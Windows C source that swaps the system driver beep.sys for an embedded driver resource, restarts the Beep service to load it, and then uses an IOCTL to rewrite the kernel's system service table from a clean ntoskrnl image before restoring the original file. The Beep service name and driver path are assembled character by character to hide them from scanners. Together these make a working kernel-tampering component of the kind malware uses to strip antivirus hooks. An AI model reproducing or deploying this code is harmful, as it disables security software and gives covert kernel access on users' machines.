#include <windows.h>
#include <shlwapi.h>
#include <winioctl.h>
#include "resource.h"
#define IOCTL_SETPROC  (ULONG)CTL_CODE( FILE_DEVICE_UNKNOWN, 0x852, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA )

#define RVATOVA(base,offset) ((PVOID)((DWORD)(base)+(DWORD)(offset)))
#define ibaseDD *(PDWORD)&ibase
#define STATUS_INFO_LENGTH_MISMATCH      ((NTSTATUS)0xC0000004L)
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)

typedef struct {
	WORD    offset:12;
	WORD    type:4;
} IMAGE_FIXUP_ENTRY, *PIMAGE_FIXUP_ENTRY;

typedef LONG NTSTATUS;

typedef NTSTATUS (WINAPI *PFNNtQuerySystemInformation)(    
	DWORD    SystemInformationClass,
	PVOID    SystemInformation,
	ULONG    SystemInformationLength,
	PULONG    ReturnLength
	);

typedef struct _SYSTEM_MODULE_INFORMATION {//Information Class 11
	ULONG    Reserved[2];
	PVOID    Base;
	ULONG    Size;
	ULONG    Flags;
	USHORT    Index;
	USHORT    Unknown;
	USHORT    LoadCount;
	USHORT    ModuleNameOffset;
	CHAR    ImageName[256];
}SYSTEM_MODULE_INFORMATION,*PSYSTEM_MODULE_INFORMATION;

typedef struct {
	DWORD    dwNumberOfModules;
	SYSTEM_MODULE_INFORMATION    smi;
} MODULES, *PMODULES;


//----------------------------------------------------------------
// stuff not found in header files
//----------------------------------------------------------------
typedef struct _UNICODE_STRING { 
    USHORT Length; 
    USHORT MaximumLength; 
#ifdef MIDL_PASS 
    [size_is(MaximumLength / 2), length_is((Length) / 2) ] USHORT * Buffer; 
#else // MIDL_PASS 
    PWSTR Buffer; 
#endif // MIDL_PASS 
} UNICODE_STRING, *PUNICODE_STRING; 

typedef long NTSTATUS; 

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0) 

typedef 
NTSTATUS 
(__stdcall *ZWSETSYSTEMINFORMATION)(
									DWORD SystemInformationClass, 
									PVOID SystemInformation, 
									ULONG SystemInformationLength
									);

typedef 
VOID 
(__stdcall *RTLINITUNICODESTRING)(
								  PUNICODE_STRING DestinationString, 
								  PCWSTR SourceString   
								  );

ZWSETSYSTEMINFORMATION ZwSetSystemInformation;
RTLINITUNICODESTRING RtlInitUnicodeString;

typedef struct _SYSTEM_LOAD_AND_CALL_IMAGE 
{ 
	UNICODE_STRING ModuleName; 
} SYSTEM_LOAD_AND_CALL_IMAGE, *PSYSTEM_LOAD_AND_CALL_IMAGE; 

#define SystemLoadAndCallImage 38 


char	g_strService[10]; // "Beep"
char	g_strBeepSys[MAX_PATH]; // "c:\\windows\\system32\\Drivers\\beep.sys"
LPBYTE	g_lpBeepSys = NULL;
DWORD	g_dwBeepLen = 0;

BOOL ModifyFromResource(HMODULE hModule, WORD wResourceID, LPCTSTR lpType, LPCTSTR lpFileName)
{
	HGLOBAL hRes;
	HRSRC hResInfo;
	HANDLE hFile;
	DWORD dwBytes = 0;
	hResInfo = FindResource(hModule, MAKEINTRESOURCE(wResourceID), lpType);
	if (hResInfo == NULL)
		return FALSE;
	hRes = LoadResource(hModule, hResInfo);
	if (hRes == NULL)
		return FALSE;
	hFile = CreateFile
		(
		lpFileName, 
		GENERIC_WRITE, 
		FILE_SHARE_WRITE, 
		NULL, 
		TRUNCATE_EXISTING,
		FILE_ATTRIBUTE_NORMAL, 
		NULL
		);
	
	if (hFile == NULL)
		return FALSE;

	WriteFile(hFile, hRes, SizeofResource(hModule, hResInfo), &dwBytes, NULL);
	CloseHandle(hFile);

	return TRUE;
}
BOOL SetProc( IN HANDLE hDriver, IN ULONG ulIndex, IN PULONG buf )
{
    if ( NULL == buf )
    {
        return FALSE;
    }
    DWORD dwReturned;
    BOOL bRet = DeviceIoControl( hDriver, IOCTL_SETPROC, &ulIndex,sizeof( ULONG ), buf, sizeof( ULONG ), &dwReturned, NULL );
    return bRet && ERROR_SUCCESS == GetLastError();
}


DWORD GetHeaders(PCHAR ibase,
                PIMAGE_FILE_HEADER *pfh,
                PIMAGE_OPTIONAL_HEADER *poh,
                PIMAGE_SECTION_HEADER *psh)

{
    PIMAGE_DOS_HEADER mzhead=(PIMAGE_DOS_HEADER)ibase;
    
    if    ((mzhead->e_magic!=IMAGE_DOS_SIGNATURE) ||        
        (ibaseDD[mzhead->e_lfanew]!=IMAGE_NT_SIGNATURE))
        return FALSE;
    
    *pfh=(PIMAGE_FILE_HEADER)&ibase[mzhead->e_lfanew];
    if (((PIMAGE_NT_HEADERS)*pfh)->Signature!=IMAGE_NT_SIGNATURE) 
        return FALSE;
    *pfh=(PIMAGE_FILE_HEADER)((PBYTE)*pfh+sizeof(IMAGE_NT_SIGNATURE));
    
    *poh=(PIMAGE_OPTIONAL_HEADER)((PBYTE)*pfh+sizeof(IMAGE_FILE_HEADER));
    if ((*poh)->Magic!=IMAGE_NT_OPTIONAL_HDR32_MAGIC)
        return FALSE;
    
    *psh=(PIMAGE_SECTION_HEADER)((PBYTE)*poh+sizeof(IMAGE_OPTIONAL_HEADER));
    return TRUE;
}


DWORD FindKiServiceTable(HMODULE hModule,DWORD dwKSDT)
{
    PIMAGE_FILE_HEADER    pfh;
    PIMAGE_OPTIONAL_HEADER    poh;
    PIMAGE_SECTION_HEADER    psh;
    PIMAGE_BASE_RELOCATION    pbr;
    PIMAGE_FIXUP_ENTRY    pfe;    
    
    DWORD    dwFixups=0,i,dwPointerRva,dwPointsToRva,dwKiServiceTable;
    BOOL    bFirstChunk;

    GetHeaders((PCHAR)hModule,&pfh,&poh,&psh);

    // loop thru relocs to speed up the search
    if ((poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress) &&
        (!((pfh->Characteristics)&IMAGE_FILE_RELOCS_STRIPPED))) {
        
        pbr=(PIMAGE_BASE_RELOCATION)RVATOVA(poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress,hModule);

        bFirstChunk=TRUE;
        // 1st IMAGE_BASE_RELOCATION.VirtualAddress of ntoskrnl is 0
        while (bFirstChunk || pbr->VirtualAddress) {
            bFirstChunk=FALSE;

            pfe=(PIMAGE_FIXUP_ENTRY)((DWORD)pbr+sizeof(IMAGE_BASE_RELOCATION));

            for (i=0;i<(pbr->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION))>>1;i++,pfe++) {
                if (pfe->type==IMAGE_REL_BASED_HIGHLOW) {
                    dwFixups++;
                    dwPointerRva=pbr->VirtualAddress+pfe->offset;
                    // DONT_RESOLVE_DLL_REFERENCES flag means relocs aren't fixed
                    dwPointsToRva=*(PDWORD)((DWORD)hModule+dwPointerRva)-(DWORD)poh->ImageBase;

                    // does this reloc point to KeServiceDescriptorTable.Base?
                    if (dwPointsToRva==dwKSDT) {
                        // check for mov [mem32],imm32. we are trying to find 
                        // "mov ds:_KeServiceDescriptorTable.Base, offset _KiServiceTable"
                        // from the KiInitSystem.
                        if (*(PWORD)((DWORD)hModule+dwPointerRva-2)==0x05c7) {
                            // should check for a reloc presence on KiServiceTable here
                            // but forget it
                            dwKiServiceTable=*(PDWORD)((DWORD)hModule+dwPointerRva+4)-poh->ImageBase;
                            return dwKiServiceTable;
                        }
                    }
                    
                } else
                    if (pfe->type!=IMAGE_REL_BASED_ABSOLUTE)
					{
                        // should never get here
                       // printf("\trelo type %d found at .%X\n",pfe->type,pbr->VirtualAddress+pfe->offset);
					}
            }
            *(PDWORD)&pbr+=pbr->SizeOfBlock;
        }
    }
    
    //if (!dwFixups) 
        // should never happen - nt, 2k, xp kernels have relocation data
       // printf("No fixups!\n");
    return 0;
}

void ReSSDT( IN HANDLE hDriver)
{
    HMODULE    hKernel;
    DWORD    dwKSDT;                // rva of KeServiceDescriptorTable
    DWORD    dwKiServiceTable;    // rva of KiServiceTable
    PMODULES    pModules=(PMODULES)&pModules;
    DWORD    dwNeededSize,rc;
    DWORD    dwKernelBase,dwServices=0;
    PCHAR    pKernelName;
    PDWORD    pService;
    PIMAGE_FILE_HEADER    pfh;
    PIMAGE_OPTIONAL_HEADER    poh;
    PIMAGE_SECTION_HEADER    psh;

    
	FARPROC NtQuerySystemInformationAddr=GetProcAddress(GetModuleHandle("ntdll.dll"),"NtQuerySystemInformation");
    // get system modules - ntoskrnl is always first there
    rc=((PFNNtQuerySystemInformation)NtQuerySystemInformationAddr)(11,pModules,4,&dwNeededSize);
    if (rc==STATUS_INFO_LENGTH_MISMATCH) {
        pModules=(MODULES *)GlobalAlloc(GPTR,dwNeededSize);
        rc=((PFNNtQuerySystemInformation)NtQuerySystemInformationAddr)(11,pModules,dwNeededSize,NULL);
    } else {
strange:
        return;
    }
    if (!NT_SUCCESS(rc)) goto strange;
    
    // imagebase
    dwKernelBase=(DWORD)pModules->smi.Base;
    // filename - it may be renamed in the boot.ini
    pKernelName=pModules->smi.ModuleNameOffset+pModules->smi.ImageName;
    
    // map ntoskrnl - hopefully it has relocs
    hKernel=LoadLibraryEx(pKernelName,0,DONT_RESOLVE_DLL_REFERENCES);
    if (!hKernel) {
        return;        
    }

    GlobalFree(pModules);

    // our own export walker is useless here - we have GetProcAddress :)    
    if (!(dwKSDT=(DWORD)GetProcAddress(hKernel,"KeServiceDescriptorTable"))) {
        return;
    }

    // get KeServiceDescriptorTable rva
    dwKSDT-=(DWORD)hKernel;    
    // find KiServiceTable
    if (!(dwKiServiceTable=FindKiServiceTable(hKernel,dwKSDT))) {
        return;
    }

    // let's dump KiServiceTable contents        
    
    // MAY FAIL!!!
    // should get right ServiceLimit here, but this is trivial in the kernel mode
    GetHeaders((PCHAR)hKernel,&pfh,&poh,&psh);

    for (pService=(PDWORD)((DWORD)hKernel+dwKiServiceTable);
            *pService-poh->ImageBase<poh->SizeOfImage;
            pService++,dwServices++)
	{
		ULONG ulAddr=*pService-poh->ImageBase+dwKernelBase;
		SetProc( hDriver,dwServices, &ulAddr );	    
	}

    FreeLibrary(hKernel);

}

void StopService(LPCTSTR lpServiceName)
{
	
	SC_HANDLE hSCManager = OpenSCManager( NULL, NULL,SC_MANAGER_CREATE_SERVICE );
	if ( NULL != hSCManager )
	{
		SC_HANDLE hService = OpenService(hSCManager, lpServiceName, DELETE | SERVICE_STOP);
		if ( NULL != hService )
		{
			SERVICE_STATUS ss;
			ControlService( hService, SERVICE_CONTROL_STOP, &ss);
			CloseServiceHandle( hService );
		}
		CloseServiceHandle( hSCManager );
	}
}

void StartService(LPCTSTR lpService)
{
	SC_HANDLE hSCManager = OpenSCManager( NULL, NULL,SC_MANAGER_CREATE_SERVICE );
	if ( NULL != hSCManager )
	{
		SC_HANDLE hService = OpenService(hSCManager, lpService, DELETE | SERVICE_START);
		if ( NULL != hService )
		{
			StartService(hService, 0, NULL);
			CloseServiceHandle( hService );
		}
		CloseServiceHandle( hSCManager );
	}
}

LPBYTE	FileToBuffer(LPCTSTR lpFileName, LPDWORD lpdwLength)
{ 
	if (lpdwLength == NULL)
		return NULL;
	DWORD	dwBytesRead = 0;
	HANDLE	hFile = CreateFile(lpFileName, GENERIC_READ, FILE_SHARE_READ, NULL, 
		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	
	if (hFile == INVALID_HANDLE_VALUE)
		return NULL;
	
	*lpdwLength = GetFileSize(hFile, NULL);
	if (*lpdwLength == 0)
		return NULL;
	LPBYTE	lpBuffer = new BYTE[*lpdwLength];
	ReadFile(hFile, lpBuffer, *lpdwLength, &dwBytesRead, NULL);
	CloseHandle(hFile);
	return lpBuffer;	
}

HANDLE LoadDriver(HMODULE hModule)
{
	g_strService[0] = 'B';
	g_strService[1] = 'e';
	g_strService[2] = 'e';
	g_strService[3] = 'p';
	g_strService[4] = '\0';

	char	szSysPath[50]; // \\Drivers\\beep.sys
	szSysPath[0] = '\\';	
	szSysPath[1] = 'D';
	szSysPath[2] = 'r';
	szSysPath[3] = 'i';
	szSysPath[4] = 'v';
	szSysPath[5] = 'e';
	szSysPath[6] = 'r';
	szSysPath[7] = 's';
	szSysPath[8] = '\\';
	szSysPath[9] = 'b';
	szSysPath[10] = 'e';
	szSysPath[11] = 'e';
	szSysPath[12] = 'p';
	szSysPath[13] = '.';
	szSysPath[14] = 's';
	szSysPath[15] = 'y';
	szSysPath[16] = 's';
	szSysPath[17] = '\0';

	// 停止服务，修改后开启服务
	StopService(g_strService);

	GetSystemDirectory(g_strBeepSys, sizeof(g_strBeepSys));
	lstrcat(g_strBeepSys, szSysPath);
	// 有可能为只读
	SetFileAttributes(g_strBeepSys, FILE_ATTRIBUTE_NORMAL);
	// 保存原来的驱动文件内容
	g_lpBeepSys = FileToBuffer(g_strBeepSys, &g_dwBeepLen);
	if (g_dwBeepLen == 0)
		return NULL;

	ModifyFromResource(hModule, IDR_SYS, "BIN", g_strBeepSys);

	StartService(g_strService);

	HANDLE hDriver = INVALID_HANDLE_VALUE;
	hDriver = CreateFileA( "\\\\.\\RESSDTDOS",
		GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL );
	return hDriver;
}

void UnloadDriver( IN HANDLE hDriver )
{
	
	CloseHandle(hDriver);
	StopService(g_strService);

	// 恢复beep.sys
	DWORD dwBytes = 0;
	HANDLE hFile = CreateFile
		(
		g_strBeepSys, 
		GENERIC_WRITE, 
		FILE_SHARE_WRITE, 
		NULL, 
		TRUNCATE_EXISTING,
		FILE_ATTRIBUTE_NORMAL, 
		NULL
		);
	
	if (hFile == NULL)
		return;

	WriteFile(hFile, g_lpBeepSys, g_dwBeepLen, &dwBytes, NULL);
	CloseHandle(hFile);
	delete g_lpBeepSys;

	StartService(g_strService);
}

bool RestoreSSDT(HMODULE hModule)
{
	HANDLE hDriver = LoadDriver(hModule);
	if (hDriver == INVALID_HANDLE_VALUE)
	{
		UnloadDriver(hDriver);
		return false;
	}
	ReSSDT(hDriver);
	UnloadDriver(hDriver);
	return true;
}